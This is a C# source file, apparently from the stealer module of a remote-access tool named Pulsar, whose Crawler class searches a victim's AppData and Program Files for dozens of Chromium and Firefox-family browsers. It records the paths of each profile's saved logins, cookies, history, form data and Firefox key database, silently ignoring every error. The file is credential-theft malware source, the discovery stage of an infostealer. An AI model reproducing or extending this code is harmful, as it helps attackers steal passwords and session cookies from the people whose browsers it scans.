using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace Pulsar.Client.Kematian.Browsers.Helpers
{
    public class Crawler
    {
        private const int MAX_DEPTH = 2;
        private static readonly string[] profileNames = { "Default", "Profile" };
        private static readonly string[] knownChromiumPaths = { "Google\\Chrome", "Microsoft\\Edge", "BraveSoftware\\Brave-Browser", "Chromium", "Vivaldi", "Opera Software\\Opera Stable", "Opera Software\\Opera GX Stable", "Opera Software", "Opera", "Epic Privacy Browser", "Yandex\\YandexBrowser", "CentBrowser", "Iridium", "UCBrowser", "Comodo\\Dragon", "SRWare Iron", "Torch", "Avast\\Browser", "Amigo", "Chedot", "Kiwi Browser", "Dragon Browser", "Slimjet", "Maxthon", "Blisk", "360 Browser", "Whale", "Atom", "Coccoc", "Cent Browser", "QQBrowser" };
        private static readonly string[] knownGeckoPaths = { "Mozilla\\Firefox", "Waterfox", "Waterfox Classic", "Pale Moon", "SeaMonkey", "LibreWolf", "Librewolf", "Basilisk", "Zen Browser", "Zen-Browser", "zen", "librewolf", "Thunderbird", "IceCat", "Cyberfox", "K-Meleon", "Cliqz", "Moonchild Productions\\Pale Moon", "Mercury Browser" };
        private static readonly string[] browserKeywords = { "opera", "firefox", "chrome", "edge", "browser", "mozilla", "librewolf", "zen", "brave", "chromium", "vivaldi", "yandex", "epic", "iridium", "ucbrowser", "centbrowser", "dragon", "iron", "torch", "avast", "waterfox", "palemoon", "seamonkey", "basilisk", "icecat", "cyberfox", "k-meleon", "cliqz", "mercury", "slimjet", "maxthon", "blisk", "whale", "atom", "coccoc", "qq" };
        private readonly HashSet<string> _scannedDirs = new HashSet<string>();

        public List<ChromiumBrowserPath> GetChromiumBrowsers()
        {
            var browsers = new ConcurrentBag<ChromiumBrowserPath>();
            _scannedDirs.Clear();
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var searchTasks = new List<Task>();
            
            foreach (var knownPath in knownChromiumPaths)
            {
                string fullPathLocal = Path.Combine(localAppData, knownPath);
                string fullPathApp = Path.Combine(appData, knownPath);
                
                if (Directory.Exists(fullPathLocal))
                    searchTasks.Add(Task.Run(() => CheckChromiumPath(fullPathLocal, browsers)));
                
                if (Directory.Exists(fullPathApp))
                    searchTasks.Add(Task.Run(() => CheckChromiumPath(fullPathApp, browsers)));
            }
            
            Task.WaitAll(searchTasks.ToArray());
            searchTasks.Clear();
            searchTasks.Add(Task.Run(() => ScanProgramFiles(browsers)));
            Task.WaitAll(searchTasks.ToArray());
            
            if (browsers.IsEmpty)
            {
                string[] rootDirs = { localAppData, appData };
                Parallel.ForEach(rootDirs, rootDir => {
                    if (Directory.Exists(rootDir))
                        SearchChromiumBrowsers(rootDir, browsers, 0);
                });
            }

            return browsers.ToList();
        }
        
        private void CheckChromiumPath(string directory, ConcurrentBag<ChromiumBrowserPath> browsers)
        {
            try
            {
                lock (_scannedDirs)
                {
                    if (_scannedDirs.Contains(directory)) return;
                    _scannedDirs.Add(directory);
                }
                
                string userDataPath = directory;
                
                if (directory.Contains("Opera Software") && !Directory.Exists(Path.Combine(directory, "User Data")))
                {
                    string[] possiblePaths = { Path.Combine(directory, "Opera Stable"), Path.Combine(directory, "Opera GX Stable") };
                    foreach (var path in possiblePaths)
                    {
                        if (Directory.Exists(path))
                            CheckChromiumPath(path, browsers);
                    }
                    return;
                }
                
                if (!directory.EndsWith("User Data"))
                    userDataPath = Path.Combine(directory, "User Data");
                
                if (Directory.Exists(userDataPath))
                {
                    string localStatePath = Path.Combine(userDataPath, "Local State");
                    if (File.Exists(localStatePath))
                    {
                        var profiles = FindChromiumProfiles(userDataPath, profileNames);
                        if (profiles.Length > 0)
                        {
                            browsers.Add(new ChromiumBrowserPath
                            {
                                LocalStatePath = localStatePath,
                                ProfilePath = userDataPath,
                                Profiles = profiles
                            });
                        }
                    }
                }
            }
            catch { }
        }
        
        private ChromiumProfile[] FindChromiumProfiles(string userDataDir, string[] defaultProfileNames)
        {
            var profiles = new List<ChromiumProfile>();
            
            try
            {
                foreach (var dir in Directory.GetDirectories(userDataDir))
                {
                    string dirName = Path.GetFileName(dir);
                    
                    if (defaultProfileNames.Any(p => dirName.StartsWith(p, StringComparison.OrdinalIgnoreCase)))
                    {
                        if (TryAddChromiumProfile(dir, profiles)) continue;
                    }
                    
                    if (dirName.Contains("Profile"))
                        TryAddChromiumProfile(dir, profiles);
                }
            }
            catch { }
            
            return profiles.ToArray();
        }
        
        private bool TryAddChromiumProfile(string profileDir, List<ChromiumProfile> profiles)
        {
            try
            {
                string webDataPath = Path.Combine(profileDir, "Web Data");
                string cookiesPath = Path.Combine(profileDir, "Cookies");
                string historyPath = Path.Combine(profileDir, "History");
                string loginDataPath = Path.Combine(profileDir, "Login Data");
                string bookmarksPath = Path.Combine(profileDir, "Bookmarks");
                
                bool hasWebData = File.Exists(webDataPath);
                bool hasCookies = File.Exists(cookiesPath);
                bool hasHistory = File.Exists(historyPath);
                bool hasLoginData = File.Exists(loginDataPath);
                bool hasBookmarks = File.Exists(bookmarksPath);
                
                if (!hasCookies)
                {
                    string networkDir = Path.Combine(profileDir, "Network");
                    if (Directory.Exists(networkDir))
                    {
                        string networkCookiesPath = Path.Combine(networkDir, "Cookies");
                        if (File.Exists(networkCookiesPath))
                        {
                            hasCookies = true;
                            cookiesPath = networkCookiesPath;
                        }
                    }
                }
                
                if (!hasCookies)
                {
                    try
                    {
                        var cookiesFiles = Directory.GetFiles(profileDir, "Cookies", SearchOption.AllDirectories)
                            .Where(f => !f.Contains("\\Journal\\") && !f.Contains("\\temp\\"))
                            .ToList();
                            
                        if (cookiesFiles.Count > 0)
                        {
                            hasCookies = true;
                            cookiesPath = cookiesFiles[0];
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error searching for cookies: {ex.Message}");
                    }
                }
                
                bool hasRequiredFile = hasWebData || hasCookies || hasHistory || hasLoginData;
                
                bool hasImportantFile = hasCookies || hasHistory || hasLoginData;
                
                if (hasRequiredFile && hasImportantFile)
                {
                    profiles.Add(new ChromiumProfile
                    {
                        WebData = hasWebData ? webDataPath : string.Empty,
                        Cookies = hasCookies ? cookiesPath : string.Empty,
                        History = hasHistory ? historyPath : string.Empty,
                        LoginData = hasLoginData ? loginDataPath : string.Empty,
                        Bookmarks = hasBookmarks ? bookmarksPath : string.Empty,
                        Name = Path.GetFileName(profileDir)
                    });
                    return true;
                }
            }
            catch (Exception ex) 
            {
                Debug.WriteLine($"Error in adding chromium profile: {ex.Message}");
            }
            
            return false;
        }
        
        private void SearchChromiumBrowsers(string rootDir, ConcurrentBag<ChromiumBrowserPath> browsers, int depth)
        {
            if (depth > MAX_DEPTH) return;

            try
            {
                if (IsPotentialBrowserDirectory(rootDir))
                    CheckChromiumPath(rootDir, browsers);
                
                foreach (var dir in Directory.GetDirectories(rootDir))
                {
                    if (!Directory.Exists(dir) || dir.EndsWith("\\Temp", StringComparison.OrdinalIgnoreCase) || 
                        dir.EndsWith("\\Temporary Internet Files", StringComparison.OrdinalIgnoreCase))
                        continue;
                    
                    SearchChromiumBrowsers(dir, browsers, depth + 1);
                }
            }
            catch { }
        }
        
        private bool IsPotentialBrowserDirectory(string dir)
        {
            string dirName = Path.GetFileName(dir).ToLowerInvariant();
            return dirName == "user data" || browserKeywords.Any(keyword => dirName.Contains(keyword)) || 
                   Directory.Exists(Path.Combine(dir, "User Data"));
        }
        
        private void ScanProgramFiles(ConcurrentBag<ChromiumBrowserPath> browsers)
        {
            try
            {
                string[] programDirs = { 
                    Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                    Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)
                };
                
                foreach (var programDir in programDirs)
                {
                    if (!Directory.Exists(programDir)) continue;
                    
                    try
                    {
                        var browserDirs = Directory.GetDirectories(programDir)
                            .Where(dir => {
                                try {
                                    return browserKeywords.Any(keyword => Path.GetFileName(dir).ToLowerInvariant().Contains(keyword));
                                }
                                catch { return false; }
                            });
                            
                        foreach (var browserDir in browserDirs)
                        {
                            string[] potentialDataDirs = {
                                Path.Combine(browserDir, "User Data"), browserDir, Path.Combine(browserDir, "data"),
                                Path.Combine(browserDir, "Data"), Path.Combine(browserDir, "profile"),
                                Path.Combine(browserDir, "Profiles")
                            };
                            
                            foreach (var dataDir in potentialDataDirs)
                            {
                                if (Directory.Exists(dataDir))
                                    CheckChromiumPath(dataDir, browsers);
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        public List<GeckoBrowserPath> GetGeckoBrowsers()
        {
            var browsers = new ConcurrentBag<GeckoBrowserPath>();
            _scannedDirs.Clear();
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var searchTasks = new List<Task>();
            
            foreach (var knownPath in knownGeckoPaths)
            {
                string fullPath = Path.Combine(appData, knownPath);
                if (Directory.Exists(fullPath))
                    searchTasks.Add(Task.Run(() => CheckGeckoProfiles(fullPath, browsers)));
            }
            
            Task.WaitAll(searchTasks.ToArray());
            searchTasks.Clear();
            searchTasks.Add(Task.Run(() => ScanProgramFilesForFirefox(browsers)));
            Task.WaitAll(searchTasks.ToArray());
            
            if (browsers.IsEmpty)
                SearchGeckoBrowsers(appData, browsers, 0);
            
            return browsers.ToList();
        }
        
        private void SearchGeckoBrowsers(string rootDir, ConcurrentBag<GeckoBrowserPath> browsers, int depth)
        {
            if (depth > MAX_DEPTH) return;
            
            try
            {
                if (IsPotentialFirefoxDirectory(rootDir))
                    CheckGeckoProfiles(rootDir, browsers);
                
                foreach (var dir in Directory.GetDirectories(rootDir))
                {
                    if (!Directory.Exists(dir) || dir.EndsWith("\\Temp", StringComparison.OrdinalIgnoreCase) || 
                        dir.EndsWith("\\Temporary Internet Files", StringComparison.OrdinalIgnoreCase))
                        continue;
                    
                    SearchGeckoBrowsers(dir, browsers, depth + 1);
                }
            }
            catch { }
        }
        
        private bool IsPotentialFirefoxDirectory(string dir)
        {
            string dirName = Path.GetFileName(dir).ToLowerInvariant();
            return dirName == "profiles" || dirName == "mozilla" || 
                   dirName.Contains("firefox") || dirName.Contains("librewolf") || 
                   dirName.Contains("waterfox") || dirName.Contains("seamonkey") || 
                   dirName.Contains("palemoon") || dirName.Contains("basilisk") || 
                   dirName.Contains("zen") || dirName.Contains("icecat") || 
                   dirName.Contains("cyberfox") || dirName.Contains("k-meleon") || 
                   dirName.Contains("cliqz") || dirName.Contains("mercury");
        }
        
        private void CheckGeckoProfiles(string directory, ConcurrentBag<GeckoBrowserPath> browsers)
        {
            try
            {
                lock (_scannedDirs)
                {
                    if (_scannedDirs.Contains(directory)) return;
                    _scannedDirs.Add(directory);
                }
                
                var profiles = FindGeckoProfiles(directory);
                if (profiles.Length > 0)
                {
                    browsers.Add(new GeckoBrowserPath {
                        ProfilesPath = directory,
                        Profiles = profiles
                    });
                }
            }
            catch { }
        }
        
        private GeckoProfile[] FindGeckoProfiles(string profilesDir)
        {
            var profiles = new List<GeckoProfile>();
            
            try
            {
                if (File.Exists(Path.Combine(profilesDir, "profiles.ini")))
                {
                    var iniPath = Path.Combine(profilesDir, "profiles.ini");
                    var iniContent = File.ReadAllText(iniPath);
                    var profilePaths = ParseProfilePaths(iniContent, profilesDir);
                    
                    foreach (var profilePath in profilePaths)
                    {
                        if (Directory.Exists(profilePath))
                            TryAddGeckoProfile(profilePath, profiles);
                    }
                }
                else
                {
                    bool isProfilesDir = false;
                    foreach (var subDir in Directory.GetDirectories(profilesDir))
                    {
                        if (TryAddGeckoProfile(subDir, profiles))
                            isProfilesDir = true;
                    }
                    
                    if (!isProfilesDir)
                        TryAddGeckoProfile(profilesDir, profiles);
                }
            }
            catch { }
            
            return profiles.ToArray();
        }
        
        private bool TryAddGeckoProfile(string profileDir, List<GeckoProfile> profiles)
        {
            try
            {
                string cookiesPath = Path.Combine(profileDir, "cookies.sqlite");
                string historyPath = Path.Combine(profileDir, "places.sqlite");
                string key4Path = Path.Combine(profileDir, "key4.db");
                string loginJsonPath = Path.Combine(profileDir, "logins.json");
                string formHistoryPath = Path.Combine(profileDir, "formhistory.sqlite");
                
                var requiredFiles = new[] { cookiesPath, historyPath, key4Path, loginJsonPath, formHistoryPath };
                var validFiles = requiredFiles.Where(File.Exists).Count();
                
                if (validFiles >= 1)
                {
                    profiles.Add(new GeckoProfile
                    {
                        Cookies = File.Exists(cookiesPath) ? cookiesPath : string.Empty,
                        History = File.Exists(historyPath) ? historyPath : string.Empty,
                        Key4DB = File.Exists(key4Path) ? key4Path : string.Empty,
                        LoginsJson = File.Exists(loginJsonPath) ? loginJsonPath : string.Empty,
                        Name = Path.GetFileName(profileDir),
                        Path = profileDir
                    });
                    return true;
                }
            }
            catch { }
            
            return false;
        }
        
        private string[] ParseProfilePaths(string iniContent, string profilesDir)
        {
            var paths = new List<string>();
            var lines = iniContent.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            string currentPath = "";
            bool isRelative = false;
            
            foreach (var line in lines)
            {
                if (line.StartsWith("[Profile", StringComparison.OrdinalIgnoreCase))
                {
                    if (!string.IsNullOrEmpty(currentPath))
                    {
                        paths.Add(isRelative ? Path.Combine(profilesDir, currentPath) : currentPath);
                    }
                    currentPath = "";
                    isRelative = false;
                }
                else if (line.StartsWith("Path=", StringComparison.OrdinalIgnoreCase))
                {
                    currentPath = line.Substring(5).Trim();
                }
                else if (line.StartsWith("IsRelative=", StringComparison.OrdinalIgnoreCase))
                {
                    isRelative = line.Substring(11).Trim() == "1";
                }
            }
            
            if (!string.IsNullOrEmpty(currentPath))
            {
                paths.Add(isRelative ? Path.Combine(profilesDir, currentPath) : currentPath);
            }
            
            return paths.ToArray();
        }
        
        private void ScanProgramFilesForFirefox(ConcurrentBag<GeckoBrowserPath> browsers)
        {
            try
            {
                Dictionary<string, string[]> firefoxVariants = new Dictionary<string, string[]>
                {
                    { "LibreWolf", new[] { "LibreWolf", null, "librewolf" } },
                    { "Zen Browser", new[] { "Zen Browser", "Zen-Browser", "zen" } },
                    { "Firefox", new[] { "Mozilla Firefox", "Firefox", "mozilla\\firefox" } },
                    { "Waterfox", new[] { "Waterfox", "Waterfox Classic", "waterfox" } },
                    { "Pale Moon", new[] { "Pale Moon", "Moonchild Productions\\Pale Moon", "moonchild productions\\pale moon" } },
                    { "SeaMonkey", new[] { "SeaMonkey", null, "mozilla\\seamonkey" } },
                    { "Basilisk", new[] { "Basilisk", null, "basilisk" } },
                    { "IceCat", new[] { "GNU IceCat", "IceCat", "icecat" } },
                    { "Cyberfox", new[] { "Cyberfox", null, "cyberfox" } },
                    { "K-Meleon", new[] { "K-Meleon", null, "k-meleon" } },
                    { "Cliqz", new[] { "Cliqz", null, "cliqz" } },
                    { "Mercury", new[] { "Mercury", "Mercury Browser", "mercury" } }
                };

                string[] programDirs = {
                    Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                    Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)
                };
                
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                
                foreach (var variant in firefoxVariants)
                {
                    List<string> installPaths = new List<string>();
                    string programPath1 = variant.Value[0];
                    string programPath2 = variant.Value[1];
                    string appDataFolder = variant.Value[2];
                    
                    foreach (var programDir in programDirs)
                    {
                        if (programPath1 != null && Directory.Exists(Path.Combine(programDir, programPath1)))
                            installPaths.Add(Path.Combine(programDir, programPath1));
                            
                        if (programPath2 != null && Directory.Exists(Path.Combine(programDir, programPath2)))
                            installPaths.Add(Path.Combine(programDir, programPath2));
                    }
                    
                    if (installPaths.Count > 0)
                    {
                        List<string> profilePaths = new List<string>();
                        string[] possibleProfileLocations = {
                            Path.Combine(appData, appDataFolder, "Profiles"),
                            Path.Combine(appData, appDataFolder),
                            Path.Combine(appData, "Mozilla", appDataFolder.Split('\\').Last()),
                            Path.Combine(localAppData, appDataFolder),
                            Path.Combine(localAppData, appDataFolder, "Profiles"),
                            Path.Combine(appData, "Mozilla", "Firefox", "Profiles")
                        };
                        
                        foreach (var loc in possibleProfileLocations)
                            if (Directory.Exists(loc)) profilePaths.Add(loc);
                        
                        foreach (var installPath in installPaths)
                        {
                            string[] possibleInstallProfilePaths = {
                                Path.Combine(installPath, "Profiles"),
                                Path.Combine(installPath, "Data", "Profiles"),
                                Path.Combine(installPath, "browser", "Profiles"),
                                Path.Combine(installPath, "defaults", "profile")
                            };
                            
                            foreach (var profilePath in possibleInstallProfilePaths)
                                if (Directory.Exists(profilePath)) profilePaths.Add(profilePath);
                        }
                        
                        foreach (var profileLocation in profilePaths)
                            CheckGeckoProfiles(profileLocation, browsers);
                    }
                }
                
                foreach (var programDir in programDirs)
                {
                    if (!Directory.Exists(programDir)) continue;
                    
                    try
                    {
                        var browserDirs = Directory.GetDirectories(programDir)
                            .Where(dir => {
                                try {
                                    string dirName = Path.GetFileName(dir).ToLowerInvariant();
                                    return dirName.Contains("firefox") || dirName.Contains("librewolf") || 
                                           dirName.Contains("waterfox") || dirName.Contains("palemoon") ||
                                           dirName.Contains("seamonkey") || dirName.Contains("mozilla") ||
                                           dirName.Contains("basilisk") || dirName.Contains("icecat") ||
                                           dirName.Contains("cyberfox") || dirName.Contains("k-meleon") ||
                                           dirName.Contains("cliqz") || dirName.Contains("mercury") ||
                                           (dirName.Contains("browser") && (
                                               File.Exists(Path.Combine(dir, "firefox.exe"))));
                                }
                                catch { return false; }
                            });
                            
                        foreach (var browserDir in browserDirs)
                        {
                            string appDataBrowserName = Path.GetFileName(browserDir).ToLowerInvariant().Replace(" ", "");
                            string[] possibleProfileLocations = {
                                Path.Combine(appData, appDataBrowserName, "Profiles"),
                                Path.Combine(appData, appDataBrowserName),
                                Path.Combine(appData, "Mozilla", appDataBrowserName),
                                Path.Combine(appData, "Mozilla", "Firefox", "Profiles"),
                                Path.Combine(localAppData, appDataBrowserName),
                                Path.Combine(localAppData, appDataBrowserName, "Profiles")
                            };
                            
                            bool foundProfiles = false;
                            foreach (var profileLocation in possibleProfileLocations)
                            {
                                if (Directory.Exists(profileLocation))
                                {
                                    foundProfiles = true;
                                    CheckGeckoProfiles(profileLocation, browsers);
                                }
                            }
                            
                            if (!foundProfiles)
                            {
                                string[] possibleInstallProfilePaths = {
                                    Path.Combine(browserDir, "Profiles"),
                                    Path.Combine(browserDir, "Data", "Profiles"),
                                    Path.Combine(browserDir, "browser", "Profiles"),
                                    Path.Combine(browserDir, "defaults", "profile")
                                };
                                
                                foreach (var profilePath in possibleInstallProfilePaths)
                                    if (Directory.Exists(profilePath)) CheckGeckoProfiles(profilePath, browsers);
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}